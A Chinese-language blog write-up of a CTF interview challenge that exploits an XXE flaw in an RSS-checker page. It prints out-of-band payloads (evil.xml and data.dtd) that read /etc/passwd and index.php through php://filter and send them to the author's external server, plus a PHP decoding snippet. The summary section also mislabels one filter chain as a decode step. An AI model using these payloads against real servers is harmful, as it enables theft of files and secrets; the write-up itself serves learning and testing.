---
title: 记一次面试某安全公司一道XXE漏洞CTF面试题
date: 2019-03-15 15:54:09
tags: 
	- XXE
	- CTF
categories: 
---

### 0x00 说在前面的话

最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。

下面直接进入主题...

<!-- more -->

### 0x01 正文

#### 1.起步

首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\00.png)

提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。

#### 2.漏洞验证

接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：

> 1.让目标服务器访问请求我们提供的XML文档。
>
> 2.我们提供的XML文档中使用了外部实体。
>
> 3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。

首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。

搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：

```
<?xml version="1.0"?> 
<!DOCTYPE ANY [ 
<!ENTITY % test SYSTEM "http://148.x.x.141/xxe_test">
%test;
]>
```

![](记一次面试某安全公司一道XXE漏洞CTF面试题\01testxml.png)

接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：`python -m SimpleHTTPServer 80`。这样我们的服务器就会开启一个监听在80端口的HTTP服务。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\QQ截图20190315163014.png)

再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\02prove.png)

在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了`/xxe_test`，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中`<!ENTITY % test SYSTEM "http://148.x.x.141/xxe_test">`就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向`http://148.x.x.141/xxe_test`(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。

#### 3.漏洞利用

确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。

读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。

直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：

> 1.确定要读取的文件，如/etc/passwd。
>
> 2.再创建一个文件，文件内容是定义实体，具体内容见下面。
>
> 3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。

首先，我们先尝试读取目标服务器的`/etc/passwd`文件。evil.xml文件内容为：

```xml-dtd
<?xml version="1.0"?> 
<!DOCTYPE ANY [ 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://148.70.34.141/data.dtd">
%dtd; %payload; %send;
]>
```

- 第3行作用是读取`/etc/passwd`文件内容，并使用php filter将内容进行压缩及Base64编码。

- 第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：

  ```xml-dtd
  <!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>">
  ```

  - 该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。
  - `&#37;`是`%`的实体，内层的实体的`%`必须要使用实体形式，否则是不能解析的。
  - 之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。

- 大概梳理一下两个文件的实体解析过程：

  > 1. `%dtd;`会执行evil.xml的第3行，执行的结果是引用了`data.dtd`文件，可以简单认为将`data.dtd`的文件内容替换`%dtd;`。
  >
  > 2. `%payload;`执行的就是`data.dtd`的内容，可简单认为，`%payload;`会被`<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>`进行替换。
  > 3. `%send;`会向`http://148.70.34.141/?data=%file;`发起请求，而发起请求前，`%file;`也会被解析，被压缩加密的`/etc/passwd`文件内容进行替换。

编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\04readpasswd.png)

并没有成功读取`/etc/passwd`，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：`/challenge/web-serveur/ch29`。

那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个`index.php`文件，尝试读取该文件，只需要的evil.xml文件中的`/etc/passwd`改为`./index.php`（允许使用相对路径）即可。

修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的`index.php`文件内容被成功发送到我们的服务器。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\06readindex.png)

接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：

```php
<?php 
echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt");
?>
```

将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。

![](记一次面试某安全公司一道XXE漏洞CTF面试题\flag.png)

### 0x03 总结

做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。

刚开始使用的是：`php://filter/read=convert.base64-decode/resource=`，只对文件内容进行编码，所以文件过大无法发送。后面使用：`php://filter/read=convert.base64-decode/zlib.inflate/resource=`进行压缩编码才成功读取。

> 压缩及编码：`echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");`
> 解压及解码：`echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");`

**参考链接：**

https://xz.aliyun.com/t/3357